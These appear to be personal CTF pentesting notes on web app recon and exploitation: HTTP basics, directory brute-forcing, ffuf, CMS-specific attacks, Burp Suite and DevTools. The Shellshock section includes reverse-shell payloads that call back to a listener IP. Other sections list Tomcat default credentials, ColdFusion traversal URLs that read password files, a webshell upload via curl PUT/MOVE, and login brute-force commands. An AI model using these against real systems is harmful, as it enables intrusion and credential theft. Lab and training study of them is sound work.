WebApp Pentesting For CTF:
=========================
Basics:
	Terms:
		Virtual Host:
			1 server, many sites
	Status Codes:
		1xx => informational
		2xx => succesful request
		3xx => redirection
		4xx => request has error in it
		5xx => server encountered an issue fulfilling the request
		200 => ok
		301 => redirects the browser to a new url PERMANENTLY
		302 => redirects the browser to a new url TEMPORARILY
		304 => tells browser to use CACHED COPY of requested resource
		400 => invalid request
		401 => Authenciation required
		403 => not allowed to see the resource, even if authorized
		404 => requested resource does not exist
		500 => internal server error
	HTTP verbs:
		Types:
			A. Safe verbs:
				They are read-only and dont alter the server
				GET/HEAD/OPTIONS
			B. Unsafe verbs:
				They alter the server
				POST/PUT/DELETE
		Exploitation of all HTTP Verbs:
			GET:
				x/login.php?id=1&pass=a
				no need to intercept
			HEAD:
				curl --head https://site.com
				Same as get except server response
			POST:
				x/login.php
				intercepted using burp
			PUT:
				it allows us to upload a file in some web directory:
				netcat:
					PUT /writable_folder/uploaded.html HTTP/1.1
					Host: domain.com
					Content-length: Content-length of file to upload
					<....content of file uploaded....>
			DELETE:
			CONNECT:
				tuneel within the HTTP protocol
			TRACE:
				echo the request as seen by the server
				Allows the client to see what is being recieved at other end of request chain.
				SHOULD NOT BE ENABLED in production
				finding TRACE enabled is a finding
				curl -i -H "cookie:---" X TRACE https://site.com
			PATCH:
			OPTIONS:
				helps in finding available verbs for a directory
				curl -i -X OPTIONS https://site.com
		How to find what verbs are supported?
			we can use "options", but it may be disabled by site.
			using the following bash script:(and netcat)
				#!/bin/bash
				for method in GET POST PUT TRACE CONNECT OPTIONS;
				do
					printf "$method / HTTP/1.1\r\nHost: www.site.com\r\n\r\n" | nc www.site.org 80	
	HTTP headers:
		Headers which start with "X-" are non-standard HTTP headers, which means that these headers are used by the webapp on its own, not by the HTTP protocol.
	Web Encodings:
		URL Encoding: Read in Password Cracking and Cryptography Sheet
		HTML Encoding: Read in Password Cracking and Cryptography Sheet
		Double Encoding: Read in Password Cracking and Cryptography Sheet
	Formats to show GET Parameters in URL:
		Normal URL Format:
			/main?id=123&lang=eng
		URL Rewrite Format:
			Rewrite URL Format => /main/id/123/lang/eng
		Mixed URL Format:
			/main/id/1223344/isadmin?uid=xxx&gid=yyy
	Web Security Mechanisms:
		Same Origin Policy:(SOP)
			It restricts how documents (D in DOM) can interact with resources loaded from another ORIGIN.
			Example: if a user visited malc.com and it invoked a GET request to site.com/profile, then, SOP would prevent malc.com from reading response of site.com/profile
			What is origin?
				Protocol (HTTP or HTTPS)
				host (www.site.com)
				port
				they determine the origin
	Session:
		A session creates a file in a temporary directory on the server where registered session variables and their values are stored.
		This data will be available to all pages on the site during that visit.
		A session ends when:
			user closes the browser
			or after leaving the site, the server will terminate the session after a time period of commonly 30 mins
		Session Tokens:
			session_variable_nmae:value
			findig name of session variable:
				use google
				example => session-id, phpsessionid
			value of session token can be:
				base64 encoded
				hash => hashcat/JTR/crackstation/google
				unguessable
	Cookies:
		Cookies are text files stored on the client computer sent by Server and they are kept of use tracking purpose
		When next time browser sends any request to web server then it sends those cookies information to the server and server uses that information to identify the user.
		initial cookie header => set-cookie: <data>
		subsequent cookie header => cookie: <data>
		cookie flags:
			secure:
				HTTPS-only
				cookies are encrypted
			Http-only:
				JS cant access these cookies				
Methodology:
	Mapping features of webapp:
		First, use webapp as normal unauthenciated user.
		Then, if there is a signup feature, ceate an account and login and visit every tab, click on every link, fill up every form.
		If it’s an e-commerce website, create an order using a fake credit card. 
		Look out for webapp features and make notes of interesting ones, example file uploads/data export/rich text editors/etc.
		Note:
			while doing it capture all the traffic with Burp.
		Note:
			It’s always tempting to switch between browser and Burp and ITS DISTRACTING.
			So, ONLY LOOK AT BROWSER DURING THIS STEP
	Looking in comments and discovering "Disabled Functionality":
		Comments:
			open source-code -> search "<!--"
		Disabled Functionality:(reveals either previous or future section os site)
			is it really disabled or is there anywhere to invoke it?
ssl cert:
	we need to see ssl cert, as it may tell us emails/names/subdomains/domains
	In case of subdomains:
		edit /etc/hosts:
			ip subdomain1 subdomain2
If we get an image only http://ip:
	Steganography => Read Exploitation Sheet
Directory Bruteforcing:
	Basics:
		Important pages:
			robots.txt
	Feroxbuster:(apt-get install feroxbuster)
		Basics:
			Fastest directory bruteforcer
		Usage:
			feroxbuster --url http://ip.com -w wordlist.txt
			Flags:
				-w wordlist.txt
				-x sh => append .sh in list (appends .sh not sh)					
				-n => no recursion.
				-d x => specify depth (depth of 0 is infinite recursion (default: 4))
				-o output.txt
				-s 302,301 => show the mentioned status codes
				-a "string" => sometimes, a site may not allow us to use gobuster crawler, so need to pass user-agent string of firefox
				-k => Disables TLS certificate validation (in case of https)
		Issue:
			This tool lacks a --cookie flag, which means we cant do authenciated directory bruetforcing. So, in case of authenciated directory bruetforcing, use gobuster
	Gobuster:(apt-get install gobuster)
		Basics:
			When to use:
				In case of Authenciated Directory Bruetforcing.
			Issue:
				Its slower
		Usage:
			gobuster dir -u http://ip.com
			Flags:
				-u => url
				-w wordlist.txt
				-o output.txt
				-x sh => append .sh in list (appends .sh not sh)
				-s 302,301 => show the mentioned status codes
				-c cookie => For Authenciated Directory Bruetforcing
				-a "string" => sometimes, a site may not allow us to use gobuster crawler, so need to pass user-agent string of firefox
				-k => Disables TLS certificate validation (in case of https)
	Note:
		wordlist for content discovery:(dirbusting)
			seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
			/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
	Note:
		previously, i used ffuf for bruetforcing, but now, we will use feroxbuster
		there is no limit on dirbusting, we dont know which files are hidden.
	Note:
		Extensions to use:
			To always use:
				-x html,txt,bak,old,sh,htm,cgi,pl,php
			if ssh and http and linux box:
				-x sh => (shellshock)
			IIS server
				-x aspx,asp,config,php
			PHP based site
				-x php
	Note:
		Status Codes play a huge role in directory bruteforcing, we can use the following codes additionally:
			401 => unathorized => may link to web-based login prompts (not pages)
Fuzzing:	
	Ffuf:(apt-get install ffuf)
		Basics:
			fast web fuzzer written in go. it can fuzz anything and can be used in dirbusting.
		Usage:
			ffuf -u https://site.com/FUZZ -w wordlist.txt
			ffuf -u https://site.com/FUZZ -w wordlist -recursion -e .aspx,.html => find files with a specific extension	
				flags:
					-recursion => recursive search
					-recursion-depth => to specify depth of recursion
					-e .ext1,.ext2 => to specify extensions
			Fuzzing Multiple Locations:
				ffuf -u https://W2/W1 -w ./wordlist.txt:W1,./domains.txt:W2 => basic usage
				ffuf -u https://FUZZDOMAIN/FUZZDIR -w ./wordlist.txt:FUZZDIR,./domains.txt:FUZZDOMAIN 
					ffuf will try every directory for the first domain, then every directory on the second domain. When running with many threads, this means sending 1000 requests to the same server in a very short amount of time. This often leads to getting rate-limited or banned.
				ffuf -u https://FUZZDOMAIN/FUZZDIR -w ./domains.txt:FUZZDOMAIN,./wordlist.txt:FUZZDIR 
					ffuf will try the first directory on all domains, before moving on to the next directory and trying that on all domains. This way you can send more requests without overloading the target servers.
			Bruetforcing login pages:
				Bruteforcing either username or password:
					ffuf -u https://site.com/login.php?user=la&pass=FUZZ -w wordlist.txt => get param
					ffuf -u https://site.com -X POST -d “username=admin\&password=FUZZ” -w wordlist.txt => post param
						flags:	
							-X <method> => to specify http method
							-d "request data" => to specify the data
				Bruteforcing both username and password:
					ffuf -request req.txt -request-proto http -mode clusterbomb -w usernames.txt:UFUZZ,passwords.txt:PFUZZ
						flags:
							-request req.text => specify a file with raw HTTP Request
								copy request from burp and paste it in req.text
								In the request file, UFUZZ is placed at login_username and PFUZZ is placed at login_password
							-request-proto =>
							-mode <attack_type> => to specify attack type:
								clusterbomb:
									Every word in user wordlist will be used with every word in pass wordlist
								pitchfork:
									Word at first position in user wordlist will be used with word at first position in pass wordlist.
									If the number of words in both lists are not same then the attack will stop as soon as the list with lesser number of words gets exhausted.
			Flags:
				-b "cookie" => to specify cookie data for authenciated fuzzing
				-t 50 => to specify no of threads (default => 40)
				-s => silent mode
				-c => coloured output
				-v => verbose mode
				-maxtime 60 => to end fuzzing after 60 seconds
				-timeout 5 => To set a timeout for each request in seconds (default => 10)
				Output:
				-o out.txt => ouput
				-of html => to write output in other format
					ffuf -u https://site.com/FUZZ -w wordlist.txt -of html -o ./output
					allowed formats:
						json
						ejson
						html
						md
						csv
						ecsv
				Filtering:
					To show:(To Match)
						-mc 200,302 => to specify Status code
						-ml => to specify amount of lines in response
						-mr => to specify regex pattern
						-mw => to specify amount of words in response
						-ms => to specify response size
					To not show:(To Filter out)
						-fc 200,302 => to filter Status code
						-fl => to filter amount of lines in response
						-fr => to filter regex pattern
						-fw => to filter amount of words in response
						-fs => to filter response size
Shellshock:(CVE-2014-6278/6271)
	Basics:	
		Its a web-based vulnerability and not SSH based.
		This vulnerability affects web servers utilizing CGI(Common Gateway Interface), which is a system for generating dynamic web content.
	Discovery:(2 steps)
		1. Is the vulnerable directory present:
			gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u ip -f
				see if any of these directories is present:
					/cgi-bin/
					/cgi-sys/
					/cgi-mod/
				Note:
					-f is used to append "/"
			Checking Manually:(May save some time)
				ip/cgi-bin/
				/cgi-sys/
				/cgi-mod/		
			Note:
				/cgi-bin is different from /cgi-bin/ and this may produce different results.
		2. if any of the above directories is present:(if we get acces code 200/403 => vulnerable)
			Look for any .sh/.cgi/.pl script in it:
				gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.56/dir_found/ -x sh,cgi
	Getting a reverse shell:
		Lets say we found http://ip/cgi-bin/user.sh:
			Using Burp:(Suggested by Rana Khalil)
				Intercept http://ip/cgi-bin/user.sh via BURP
				Edit the User-Afent:
					() { ignored;};/bin/bash -i >& /dev/10.10.14.6/4444/port 0>&1
				nc -nvlp 443
			Using cURL:
				curl -H "UserAgent: () { :; }; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.2.2\",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" http://ip/cgi-bin/user.sh
			shellshock.py:(https://github.com/zalalov/CVE-2014-6271)
				python2 shellpoc.py ip /cgi-bin/user.sh my_tun0/443
	Sometimes, getting a revshell is not possible:
		gobuster -u http://ip/ -w /usr/share/seclists/Discovery/Web_Content/cgis.txt -s '200,204,403,500' -e
			This wordlist for look for juicy files such as /etc/passwd available via /cgi-bin/
CMS WebApps:
	Recon and Exploitation Methodology:
		if we see configuration page => Misconfigured webapp 
		locate login and signup pages:
			Directory Bruteforcing
			Gooogle "name of webapp"
		Once located login and signup pages:
			On login page:
				try default creds
				bruteforcing using medusa/hydra/burp
					Bruteforcing may result in "Account lockouts"
				sqli
			On signup page:
				sqli
		once we become admin => upload shell
	CMS-Specific Exploitation:
		SharePoint:(HTB::Tally)
			Basics:
			Exploitation:
				Directory Bruteforcing wordlist:
					/usr/share/seclists/Discovery/Web-Content/CMS/sharepoint.txt
		WebDAV:
			Basics:
			Exploitation:
				Davtest:(apt-get install davtest)
					Basics:
					Usage:
						davtest --url http://<ip> => tells about type what file types can be uploaded/executed
						Flags:
		IIS 6.0:
			Basics:
			Exploitation:
				ScStoragePathfromURL BOF:
					https://github.com/MrMafiaP/iis6-exploit-2017-CVE-2017-7269
					used in HTB::grandpa
		HFS:
			Basics:
			Exploitation:
				HFS 2.3:
					ippsec HTB::optimum video explains the whole vulnerability.
					Its important to understand the exploitation process as sometimes exploit-db exploit fails.
		Coldfusion:
			Basics:
			Exploitation:
				Read when Coldfusion CMS comes:
					https://nets.ec/Coldfusion_hacking
				ColdFusion 6:
					http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%00en
				Coldfusion 7:
					http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en
				Coldfusion 8:
					/CFIDE/administrator => login page
					CVE-2010-2861:
						https://www.exploit-db.com/exploits/14641
						used in HTB::arctic
					We can upload a shell via webapp if we are admin, to see the process:
						HTB::arctic
		Tomcat:(Apache Tomcat)
			Used in HTB::Jerry
			Default creds:
				admin:password 
				admin:<blank>  
				admin:Password1
				admin:password1
				admin:admin    
				admin:tomcat   
				both:tomcat   
				manage:manager  
				role1:role1    
				role1:tomcat   
				role:changethi
				root:Password1
				root:changethis
				root:password 
				root:password1
				root:r00t     
				root:root     
				root:toor     
				tomcat:tomcat   
				tomcat:s3cret   
				tomcat:password1
				tomcat:password 
				tomcat:<blank>
				tomcat:admin
				tomcat:changethis
		PHPMyAdmin:
			Basics:
				PHPMyAdmin is a web-based administration tool for MySQL databases
				Important Pages:
					ip/phpmyadmin/ => Login page
					ip/phpmyadmin/ChangeLog => Contains version
		Gitlab:(HTB::Bitlab)
			Basics:
				It is an opensource version of github.
			Exploitation:
				There are no direct exploots for gitlab, so we exploit by exploting features/misconfigurations. 
				We will need to use "Git" to do recon and exploitation.
				Note:
					Read Github Sheet to know about Git.
		Jboss:
		Jenkins:
			Basics:
				Jenkins CMS by default runs on port 50000
			Exploitation:
				CVE-2019-1003000:(Unathenticated RCE)
					HTB::Jeeves
		Joomla:
			Basics:
				Important Pages:
					joomla/administrator => login page for admin
					joomla/configuration.php => configuration page
					joomla/diagnostics.php
					joomla/joomla.inc.php
					joomla/config.inc.php
			Exploitation:
				Joomscan:
					Basics:
					Usage:
						joomscan -u <url> --ec => it tells versions of joomla
						Flags:
							--ec => enumerate components
		Magento:(HTB::Swagshop)
			Note:
				name is "Magento", not "Magneto"
			Basics:
				Magento is basically an online e-store CMS.
				Important Pages:
					/admin => admin login page
			Exploitation:
				Magescan:(github link?)
					Usage:
						php magescan.phar scan:all http://ip
		Wordpress:
			Basics:
				Important Pages:
					wordpress/wp-login.php => login page for admin
					wordpress/wp-admin.php => admin page
					wordpress/wp-config.php => configuration page
					wordpress/wp-json/wp/v2/users => shows users registered on wordpress
			Exploitation:
				Note:
					In HTB, if WP is present, always add domain_name in /etc/hosts file
				Wpscan:
					Installation:
						wpscan makes issues on kali all the time, so:
						apt remove wpscan
						gem install wpscan
						to update:
							wpscan --update
					Usage:
						wpscan can be used to:
							Find vulnerabilities
							Brutefocre accounts
							Enumerate users/plugins
						wpscan --url ip => to see vulnerabilities
						wpscan --url ip --disable-tls-check => https
						wpscan --url ip --enumerate u => enumerate users
							there may be some GUEST accounts open on WP
						wpscan --url ip -P pass.txt -U user.txt –threads 2 => for bruteforcing
						wpscan --url <ip> --enumerate u,at,vp  
						Flags:
							-o output.txt
							--enumerate u => enumerate users
							--enumerate ap => enumerate all plugins
							--enumerate vp => enumerate only vulnerable plugins
							--enumerate at => enumerate all themes
							--enumerate vt => enumerate only vulnerable themes
							Bruteforcing:
								-U user.txt
								-P file.txt
				wpvulnhub.com => vulnerable plugins/themes
		Drupal:
			Basics:
				Important Pages:
					/settings.php => configuartion page (we can get db_pass and db_username here)
					/CHANGELOG.txt => it reflects the version and last update of drupal cms
			Exploitation:
				Droopescan:(https://github.com/droope/droopescan)
					Usage:
						droopescan scan drupal -u <url>
						Flags:
							-u => url
							-e p => plugins
								t => themes
								v => version of drupal installed
								a => all
				Exploits:
					Drupalgeddon:(CVE-2014-3704)
						Drupal 7.0 < 7.31
					Drupalgeddon2:(CVE-2018-7600)
						Drupal < 6.x?, 8.5.x < 8.5.1, 8.4.x < 8.4.6, 8.x < 8.3.9, 7.x? < 7.58
						https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7600.py
						used in HTB::Bastard
					Drupalgeddon3:(CVE-2018-7602)
						Drupal < 7.58
						https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7602.py
				Getting reverse shell in drupal:
					log in the cms
					goto Manage>Extend>List>Install new module
					download https://www.drupal.org/project/php and install it
					then enable it
					goto Manage > Extend >filters and enable the checkbox for PHP filters
		Gunicorn:(HTB::Cap)
			Basics:
				It is a WSGI server written in python.
				It basically sits in front of a WebApp written in python like this:
					     |           |
					User -> Gunicorn -> Python WebApp
					     |           |
		CMSMap:(WordPress|Joomla|Drupal|Moodle)
			Installation:
				git clone https://github.com/Dionach/CMSmap
				edit cmsmap.conf:
					[exploitdb]
					edbtype = APT
					edbpath = /usr/share/exploitdb/
				pip3 install .
			Usage:
	Note:
		Always google "webapp_name source version_number" to see source files which may have left behind on webserver after installation
Login Bruteforce:
	Read Password Cracking and Cryptography Sheet for this.
Using cookies to become authenciated user:(aka Session Hijacking)
	Lets assume that somehow we got cookie for an authenciated user and now we want to use that cookie to authenciate ourselves.
	Requirement:
		We need to install "Cookie Editor" Add-on 
	Firefox -> go to the victim site -> press on icon of "Cookie Editor" Add-on -> Press "Add" button -> Add the Cookie name and value -> Reload the webpage.
Testing Get parameters for available injection:
	sit.php?param=value
	always try these 3 values:
		1
		0
		-1
Important Tools:
	cURL:
		Basics:
			Difference between CURL and WGET:
				CURL => opens a webpage in a terminal.
		Usage:
			curl -i -X POST http://ip:port --data "hello"
				Flags:
					--head => use head verb
					-X => specify request method(always specify method in caps)
						curl -X PUT http://10.10.10.15/0xdf.txt -d @cmdasp.aspx => put
						curl -X MOVE -H 'Destination:http://10.10.10.15/0xdf.aspx' http://10.10.10.15/0xdf.txt => move
					--data "value"=> used with -X post
					-H <header> => used to supply cookie for authenciated testing
					-i => show reponse headers
		Note:
			As far as "Forensics" are concerned, we should use Wget instead of cURL to download files as cURL has a major issue of changing "Origin Date" header to current date in meta-data of a file.
			To test this, we can download any webpage via both Wget and cURL and use exif on them.
	Burp Suite:
		Basics:
			Target:
				sitemap:
					it has list of different websites we intercepted. Select the target_website and "add to scope"
					scope:
						where automated scanning and testing occurs
						non-scope items are not actively scanned
			Proxy:
				History:
					conatins all the last requests and their consecutive responses
			Change Request Method:
			Hot Keys:
				ctrl + shift + p => proxy
				ctrl + shift + r => Repeater
				ctrl + shift + I => intruder
				ctrl + r => send this to Repeater
				ctrl + i => send this to intruder
			change color in burp:
				user options -> display -> http message display
		Recon:
			spider:(step-1)
				it crawls the website and finds different files/forms/HTTP methods/ etc.
				Its the 1st step in a website pentest
				sitemap -> select website -> right click -> spider this host
			discover content:(step-2)
				there are some pages/folders which are not directly linked with website like /admin/
				sitemap -> select website-> right click -> egagement tools -> dicover content => this will open up the discovery module, then:
					click "session is not running": 
						it starts "smart bruteforcing":
							it means, burp learns from files and folders it find within the target and make better choices
			active scanner:(step-3)
				finds VULNERABILITIES by attacking parameters/requests
				sitemap -> select website -> right click -> actively scan this host
				NOTE:
					This is extremly loud on network. It may submit extensive queries in the application. So, its better to tell the client when we are gonna do this attack
				NOTE:
					To descrease scan times, increase the number of threads in "active can engine section"
					Be careful, as u may take down a small site, if thread count is too high
		Exploitation:
			Intruder:(Automated FUZZING)
				Types:	
					sniper => one payload at a time
					Battering RAM => gives same value to all payloads at same time
						USED FOR XSS
					Pitchfork => uses diff dictionary for all payloads 
					clusterbomb => same as pitchfork but every value in 1st dict is matched against every value of dict2
				FUZZING:
					parameter fuzzing:
						its different from directory bruteforcing as here we FUZZ parameters.
						items.php?id=x
						example:
							suppose a website is going to have a sale next week, its possible it has already uploaded the sale stuff, but made no links(due to which we are not able to see it), then we can use FUZZING to find sale items.
						Usage:
							XSS				
				Using Burp Intruder for Bruteforcing login pages:
					First Select the request -> right-click -> Send to Intruder
					In the Intruder Tab:
						Positions Tab:
							Select the fields which we wanna bruteforce or change in each request such as Session_token/username/password
							If we know user_name, then type the username and dont select it as a payload
							Select the attack-type, mostly we use "pitchfork"
						Payloads Tab:
							For Cookie-Field:
								Cookies in a nth request is present in (n-1)th response. So, we will use "Recursive grep" payload, it  searches a response with grep for a predefined value and makes the results available for the next request.
						Options Tab:
							In order to use "Recursive grep" payload, we will need to first define it using "Grep-Extract"
						Once all set, start-attack. We will know if we found a valid pair of creds by changed status code.	
				Note:
					use seclists
			Repeater:
			sequencer:(for session token gathering)
				find a response having session tokens -> right click -> send to sequencer -> identify the session tokens to analyse -> click "Start live capture" (it will start generating session tokens)
				it tells entropy(randomness), character-level analysis, bit-level analysis
		Extender:(aka Bwapp store)
			Good Extensions:
				Request Highlighter:
					highlights the requests
				Turbo Intruder:
					faster than burp intruder
					payload place => '%s'
					start/stop turbo intruder => ctrl + enter
				logger++:
					logs every request and response and can filter them
				sqlipy:
					sqlmap with burp
					pg-117(thpv2)
		Reporting:
			Scanner tab -> right click on selected url -> report selected issue
	Chrome DevTools:
		for a bug bounty hunter, only 4 are important:
			console:
				its used to log messages along with the name of JS file which caused the message
					its done by using these JS func's:
						console.log("message")
						console.warn("message")
						console.error("message")
					to open that JS file, double click on its name, we will go to SOURCES tab showing using the JS file along with a highlighted line which caused the log.
				used to write custom JS, can be used in XSS
					> alert()
			sources:
				shows assets/resources
				a site can have assets of other sites too such as google fonts.
				we mostly use this to view JS files.
					when we open a JS file in it, to make it look less congested, click "{}" button on bottom left (a.k.a prettyprint)
					we can also debug JS files:
						done to understand the code, a.k.a static analysis
						to add a breakpoint, click on line number of JS code and reload the site, the site will pause at that breakpoint.
					we mostly look for "API keys" in JS files
						tool: subdomainizer (see RECON)
			network:
				it shows network requests when we reload the webpage
				settings:
					enable "disable cache":
						to not get cached responses from server/browser
					disbale "show overview":
						no use
				when we double click any request, it shows us:
					header
					preview => show preview/code
					reponse => raw interpreation by server
					indicator => chain of requests
					timing
					cookies
				it also has filters:(imp)
					they help us filters requests by JS/XHR/etc.
					JS files:
						right click	on JS file -> open in sources -> see code
					XHR files:
						XML HTTP Requests
						AJAX
						fetching remote files with JS
						its used for API Calls (/api)
			application:
			elements tab:
				HTML DOM
				it also corrects any mistakes in HTML code
				differnce b/w elements tab and page source:
					page source => shows ACTUAL HTML code
					elements tab => shows CORRECTED HTML code